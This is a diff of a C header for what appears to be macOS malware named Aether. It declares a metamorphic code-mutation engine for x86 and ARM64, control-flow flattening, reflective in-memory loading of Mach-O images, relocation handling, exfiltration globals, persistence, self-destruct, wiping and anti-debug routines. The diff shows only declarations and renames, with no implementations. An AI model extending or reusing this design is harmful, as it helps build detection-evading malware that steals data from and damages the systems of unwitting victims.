@@ -31,6 +31,7 @@
 #include <arpa/inet.h>
 #include <sys/sysctl.h>
 #include <libproc.h>
+#include <stdatomic.h>
 
 #include <mach-o/dyld.h>
 #include <mach-o/loader.h>
@@ -46,7 +47,6 @@
 #include <openssl/pem.h>
 #include <openssl/rand.h>
 #include <openssl/aes.h>
-#include <openssl/rsa.h>
 
 #include <curl/curl.h>
 #include <zlib.h>
@@ -66,9 +66,9 @@
 #endif
 
 /* Macros */
-#define KEY_SIZE 32 // K_SZ
-#define IV_SIZE 16  // IV_SZ
-#define _CAPZ 1024
+#define K_SZ 32 
+#define IV_SZ 16  
+#define _CAPZ 2048  
 #define NOFFSET__ UINT64_MAX
 #define _CVZ 64
 #define PAD_ 8
@@ -76,17 +76,17 @@
 #define _FIN 0.7f
 #define _ZMAX 65536
 #define _CAP(size) ((size) / 100 + 1)
-#define LOADED_IMAGES 16 // _IMGZ
+#define _IMGZ 16
 #define PS_Z 4096 
 #define M_FL 100
 
-#define PAGE_SIZE_64 0x4000  // PS_Z
-#define ALIGN_PAGE(x) (((x) + PAGE_SIZE_64 - 1) & ~(PAGE_SIZE_64 - 1))
+#define PS_64 0x4000 
+#define ALIGN_P(x) (((x) + PS_64 - 1) & ~(PS_64 - 1)) 
 #define ALIGN_8(x) (((x) + 7) & ~7)
 
-#define MX_GEN 3
-#define MX_MEM 8
-static const uint8_t MORPH_MAGIC[8] = {'A', 'E', 'T', 'H', 'R', 0, 0, 0};
+#define MX_GEN 8 /* Gen pour Memory/Disk */
+#define SNP_SH 256 
+static const uint8_t MAGIC[8] = {'A', 'E', 'T', 'H', 'R', 0, 0, 0}; 
 
 /* DEBUG=1 (FOO flag) */
 #ifdef FOO
@@ -182,7 +182,7 @@ typedef struct {
 
 /* ChaCha RNG state */
 typedef struct {
-    uint8_t key[KEY_SIZE];
+    uint8_t key[K_SZ];
     uint8_t iv[16];
     uint8_t stream[64];
     size_t position;
@@ -190,11 +190,10 @@ typedef struct {
 } chacha_state_t;
 
 /* For inline mutator referenced before its definition */
-__attribute__((always_inline)) inline void _mut8(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen);
+typedef struct engine_context_s engine_context_t;
+void _mut8(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen, const engine_context_t *ectx);
 
 /* Core typedefs and structs */
-
-/* Single entry */
 typedef struct {
     size_t offset;
     size_t length;
@@ -338,22 +337,22 @@ typedef uint8_t arm_reg_t;
 
 /* ARM64 condition codes */
 typedef enum {
-    ARM_COND_EQ = 0,  // Equal
-    ARM_COND_NE = 1,  // Not equal
-    ARM_COND_CS = 2,  // Carry set (HS)
-    ARM_COND_CC = 3,  // Carry clear (LO)
-    ARM_COND_MI = 4,  // Minus/negative
-    ARM_COND_PL = 5,  // Plus/positive or zero
-    ARM_COND_VS = 6,  // Overflow
-    ARM_COND_VC = 7,  // No overflow
-    ARM_COND_HI = 8,  // Unsigned higher
-    ARM_COND_LS = 9,  // Unsigned lower or same
-    ARM_COND_GE = 10, // Signed greater than or equal
-    ARM_COND_LT = 11, // Signed less than
-    ARM_COND_GT = 12, // Signed greater than
-    ARM_COND_LE = 13, // Signed less than or equal
-    ARM_COND_AL = 14, // Always
-    ARM_COND_NV = 15  // Always (reserved)
+    ARM_COND_EQ = 0,  /* Equal */
+    ARM_COND_NE = 1,  /* Not equal */
+    ARM_COND_CS = 2,  /* Carry set (HS) */
+    ARM_COND_CC = 3,  /* Carry clear (LO) */
+    ARM_COND_MI = 4,  /* Minus/negative */
+    ARM_COND_PL = 5,  /* Plus/positive or zero */
+    ARM_COND_VS = 6,  /* Overflow */
+    ARM_COND_VC = 7,  /* No overflow */
+    ARM_COND_HI = 8,  /* Unsigned higher */
+    ARM_COND_LS = 9,  /* Unsigned lower or same */
+    ARM_COND_GE = 10, /* Signed greater than or equal */
+    ARM_COND_LT = 11, /* Signed less than */
+    ARM_COND_GT = 12, /* Signed greater than */
+    ARM_COND_LE = 13, /* Signed less than or equal */
+    ARM_COND_AL = 14, /* Always */
+    ARM_COND_NV = 15  /* Always (reserved) */
 } arm_condition_t;
 
 /* ARM64 instruction structure */
@@ -364,35 +363,35 @@ typedef struct {
     uint16_t opcode;
     arm_op_type_t type;
     
-    // Operands
+    /* Operands */
     arm_reg_t rd;
     arm_reg_t rn;
     arm_reg_t rm;
-    arm_reg_t ra;  // For MADD/MSUB
+    arm_reg_t ra;  /* For MADD/MSUB */
     
     uint64_t imm;
     int64_t target;
     uint8_t imm_size;
     
-    // Flags
+    /* Flags */
     bool valid;
     bool is_64bit;
     bool is_signed;
     bool is_control_flow;
     bool modifies_ip;
     bool is_privileged;
-    bool privileged;  // Alias
-    bool ring0;       // Alias
+    bool privileged;  /* Alias */
+    bool ring0;     
     
-    // Shift/extend info
-    uint8_t shift_type;  // 0=LSL, 1=LSR, 2=ASR, 3=ROR
+    /* Shift/extend info */
+    uint8_t shift_type;  /* 0=LSL, 1=LSR, 2=ASR, 3=ROR */
     uint8_t shift_amount;
-    uint8_t extend_type; // UXTB, UXTH, UXTW, UXTX, SXTB, SXTH, SXTW, SXTX
+    uint8_t extend_type; /* UXTB, UXTH, UXTW, UXTX, SXTB, SXTH, SXTW, SXTX */
     
-    // Condition code (for B.cond)
+    /* Condition code (for B.cond) */
     arm_condition_t condition;
     
-    // Register tracking
+    /* Register tracking */
     uint8_t regs_read[4];
     uint8_t regs_written[2];
     uint8_t num_regs_read;
@@ -438,7 +437,7 @@ typedef struct {
     uint8_t vex_pp;
     uint8_t vex_L;
     uint8_t vex_vvvv;
-    uint8_t evex_mmmm;
+    uint8_t evex_mmmm; 
     uint8_t evex_pp;
     uint8_t evex_L;
     uint8_t evex_vvvv;
@@ -446,6 +445,11 @@ typedef struct {
     uint8_t sib_index;
     uint8_t sib_scale;
     operand_t ops[3];
+    size_t disp_offset;         
+    size_t modrm_offset;         /* ModR/M byte offset within instruction */
+    size_t imm_offset;          
+    bool has_imm;                /* Whether instruction has immediate */
+    bool is_rel_imm;            
 } x86_inst_t;
 
 typedef struct {
@@ -497,13 +501,15 @@ typedef struct {
 } rec_flowmap;
 
 /* Engine/context settings */
-typedef struct {
+typedef struct engine_context_s {
     const uint8_t *debug_code;
     size_t debug_code_size;
     bool unsafe_mode;
-    uint8_t arch_type;           /* ARCH_X86 or ARCH_ARM */
-    unsigned mutation_count;     /* Total mutations applied */
-    unsigned generation;         /* Current generation number */
+    uint8_t arch_type;           
+    unsigned mutation_count;   
+    unsigned generation;         
+    uint64_t *protected_ranges;  /* Array of [start, end] pairs */
+    size_t num_protected;      
 } engine_context_t;
 
 /* Text section mapping */
@@ -514,7 +520,7 @@ typedef struct {
     uint64_t vm_end;
 } text_section_t;
 
-/* Small x86 read/write summary */
+/* x86 read/write summary */
 typedef struct {
     uint8_t rd_reegs[8];
     uint8_t wr_reegs[8];
@@ -524,9 +530,36 @@ typedef struct {
     bool mem_wr;
     bool flag_rd;
     bool flag_wr;
-} x86_shit;
+} small_x86;  
 
-/* context_t: central workspace */
+/* Relocation entry */
+typedef struct {
+    size_t offset;          
+    size_t instruction_start;
+    uint8_t type;           /* Relocation type */
+    int64_t addend;       
+    uint64_t target;        /* Original target address */
+    bool is_relative;       /* PC-relative or absolute */
+    char *symbol_name;      
+    size_t instruction_len;
+} reloc_entry_t;
+
+/* Relocation table */
+typedef struct {
+    reloc_entry_t *entries;
+    size_t count;
+    size_t capacity;
+    uint64_t original_base;
+} reloc_table_t;
+
+/* Relocation types */
+#define RELOC_NONE      0
+#define RELOC_ABS64     1  /* 64-bit absolute address */
+#define RELOC_REL32     2  /* 32-bit PC-relative */
+#define RELOC_CALL      3  /* Call instruction */
+#define RELOC_JMP       4  /* Jump instruction */
+#define RELOC_LEA       5  /* LEA with RIP-relative */
+
 typedef struct {
     uint8_t *ogicode;
     uint8_t *working_code;
@@ -550,8 +583,14 @@ typedef struct {
     struct mach_header_64 *hdr;
     
     size_t original_size;
-    size_t max_allowed_growth;
+    size_t allowed_growth;
     size_t current_growth;
+    
+    /* Relocation tracking */
+    reloc_table_t *reloc_table;
+
+    uint8_t entry_backup[SNP_SH];
+    size_t entry_len;
 } context_t;
 
 typedef struct {
@@ -578,7 +617,7 @@ typedef struct {
     bool valid;
 } arm64_expansion_t;
 
-// Wipe 
+/* Wipe  */
 typedef enum {
     WIPE_ZERO,
     WIPE_ONE,
@@ -610,7 +649,8 @@ typedef struct {
 } enc_vault_t;
 
 typedef struct {
-    void *base;              
+    void *base;              /* RX mapping */
+    void *rw_base;           /* RW mapping */
     size_t size;            
     struct mach_header_64 *header;
     void *entry_point;      
@@ -620,7 +660,10 @@ typedef struct {
     uint64_t min_vmaddr;     
     bool has_relocations;   
     pthread_t entry_thread;  
-    bool entry_running;     
+    bool entry_running;
+    bool is_dual_mapped;     /* True if RW and RX are separate */
+    bool is_jit;             /* True if using MAP_JIT */
+    reloc_table_t *reloc_table;  /* Relocation table for this image */
 } image_t;
 
 typedef struct {
@@ -662,6 +705,14 @@ typedef struct {
     bool is_call;
     } info_t;
 
+typedef struct {
+    void *rw_base;      /* Read-Write mapping for loading */
+    void *rx_base;      /* Read-Execute mapping for execution */
+    size_t size;
+    bool is_dual;       /* True if RW and RX are different addresses */
+    bool is_jit;        /* True if using MAP_JIT */
+} mapping_t;
+
 /* Global state for exfil */
 extern char *_strings[8];
 extern file_t *files[M_FL];
@@ -700,13 +751,12 @@ void init_engine(engine_context_t *ctx);
 /* Decoder */
 bool decode_x86(const uint8_t *code, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);
 bool decode_x86_withme(const uint8_t *code, size_t size, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);
-bool decode_arm64(const uint8_t *code, arm64_inst_t *inst);
 
 /* Expansion */
 bool apply_expansion(uint8_t *code, size_t *size, size_t offset, 
                      const x86_inst_t *inst, liveness_state_t *liveness,
                      chacha_state_t *rng);
-size_t expand_code_section(uint8_t *code, size_t size, size_t max_size,
+size_t expand_code(uint8_t *code, size_t size, size_t max_size,
                             liveness_state_t *liveness, chacha_state_t *rng,
                             unsigned expansion_intensity);
 size_t expand_with_chains(uint8_t *code, size_t size, size_t max_size,
@@ -715,29 +765,31 @@ size_t expand_with_chains(uint8_t *code, size_t size, size_t max_size,
 size_t mov_immediates(uint8_t *code, size_t size, size_t max_size,
                                    liveness_state_t *liveness, chacha_state_t *rng,
                                    unsigned chain_depth);
-size_t chain_expand_arithmetic(uint8_t *code, size_t size, size_t max_size,
+size_t expand_arithmetic(uint8_t *code, size_t size, size_t max_size,
                                liveness_state_t *liveness, chacha_state_t *rng,
                                unsigned chain_depth);
 
 #if defined(__aarch64__) || defined(_M_ARM64)
-bool apply_arm64_expansion(uint8_t *code, size_t *size, size_t max_size,
+bool apply_arm64(uint8_t *code, size_t *size, size_t max_size,
                            size_t offset, const arm64_inst_t *inst,
                            liveness_state_t *liveness, chacha_state_t *rng);
-size_t expand_arm64_code_section(uint8_t *code, size_t size, size_t max_size,
+size_t expand_arm64(uint8_t *code, size_t size, size_t max_size,
                                  liveness_state_t *liveness, chacha_state_t *rng,
                                  unsigned expansion_intensity);
 #endif
 
 /* Mutation */
 void scramble_x86(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen,
-                  muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity);
+    muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity,
+    const engine_context_t *ectx);
 #if defined(__aarch64__) || defined(_M_ARM64)
 void scramble_arm64(uint8_t *code, size_t size, chacha_state_t *rng, unsigned gen,
-                    muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity);
+                    muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity,
+                    const engine_context_t *ectx);
 #endif
 
 /* Control flow */
-void flatline_flow(uint8_t *code, size_t size, flowmap *fm, chacha_state_t *rng);
+void flatline_flow(uint8_t *code, size_t size, flowmap *cfg, chacha_state_t *rng);
 void shuffle_blocks(uint8_t *code, size_t size, void *rng);
 
 /* Validation */
@@ -751,7 +803,24 @@ bool V_machO(const uint8_t *data, size_t size);
 
 /* Reflective loading */
 bool exec_mem(uint8_t *data, size_t size);
-image_t* load_image(uint8_t *data, size_t size);  
+image_t* load_image(uint8_t *data, size_t size);
+
+/* Memory */
+void* alloc_dual(size_t size, void **rx_out);
+void free_dual(void *rw_addr, void *rx_addr, size_t size);
+#if defined(__aarch64__)
+void* jit_alloc(size_t size);
+void write_enable(void);
+void write_disable(void);
+#endif
+
+/* Relocation support */
+reloc_table_t* reloc_scan(uint8_t *code, size_t size, uint64_t base_addr, uint8_t arch);
+bool reloc_apply(uint8_t *code, size_t size, reloc_table_t *table, uint64_t new_base, uint8_t arch);
+void reloc_free(reloc_table_t *table);
+bool reloc_export(reloc_table_t *table, uint8_t **out_data, size_t *out_size);
+reloc_table_t* reloc_import(uint8_t *data, size_t size);
+bool own_self(reloc_table_t *table, size_t code_size); 
 
 /* Persistence */
 int persist(void);
@@ -765,7 +834,7 @@ int mutator(void);
 
 /* Self-destruct */
 void k_ill(void) __attribute__((noreturn));
-void panic(void) __attribute__((noreturn));
+void die(void) __attribute__((noreturn)); 
 
 /* Vault */
 void Init_str(void);
@@ -778,4 +847,4 @@ void mint_uuid(char *id);
 /* Anti-debug */
 int scan(void);
 
-#endif /* AETHER_H */
+#endif  /* AETHER_H */
